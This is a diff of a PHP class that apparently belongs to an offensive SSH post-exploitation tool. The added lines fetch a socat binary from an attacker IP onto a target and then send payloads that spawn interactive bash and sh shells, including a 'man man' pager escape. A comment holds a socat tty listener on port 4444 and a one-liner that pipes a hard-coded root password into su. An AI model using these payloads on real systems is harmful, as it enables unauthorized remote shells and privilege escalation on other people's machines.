@@ -414,8 +414,13 @@ class SERVICE extends service2ssh {
 	            fputs($stream, "$data\n");
 	            echo stream_get_contents($stream);
 	            
+	            $ip_attacker = $this->ip4addr4target($this->ip);
+	            $filename = "socat";
+	            $path_remotebin_socat = $this->bin2path($this->stream,$filename,$ip_attacker);
 	            /*
-	             $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
+	             
+	    
+	             $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | $path_remotebin_socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
 	             $this->article("DATA", $data);
 	             fputs($stream, "$data\n");
 	             $rst_app =  stream_get_contents($stream);
@@ -587,7 +592,7 @@ class SERVICE extends service2ssh {
 	            $tmp = stream_get_contents($stream);
 	            echo "$tmp\n";
 	            
-	            $data = "socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
+	            $data = "$path_remotebin_socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
 	            $this->article("DATA", $data);
 	            fputs($stream, "$data\n");
 	            $tmp = stream_get_contents($stream);
@@ -704,7 +709,7 @@ class SERVICE extends service2ssh {
 	            
 	            
 	            
-	            // socat file:`tty`,raw,echo=0 tcp-listen:4444
+	            // $path_remotebin_socat file:`tty`,raw,echo=0 tcp-listen:4444
 	            // echo -e "su - root <<! >/dev/null 2>&1\nsateam123456789\nwhoami > /dev/tty\nls > /dev/tty\n!" | bash
 	            
 	            
@@ -1146,7 +1151,7 @@ This can also be used to determine local IPs, as well as gain a better understan
 	    if( !empty($files_found)) return $files_found ;
 	    
 	    
-	    $data = "find / -iname $filename -type f -exec ls {} \;";
+	    $data = "find / -iname $filename -type f -exec ls {} \; 2> /dev/null ";
 	    $files_found = "";
 	    $files_found = trim($this->req_str($stream,$data,$this->stream_timeout*3,"$this->filter_file_path | grep '$filename' "));
 	    if( !empty($files_found)) return $files_found ;
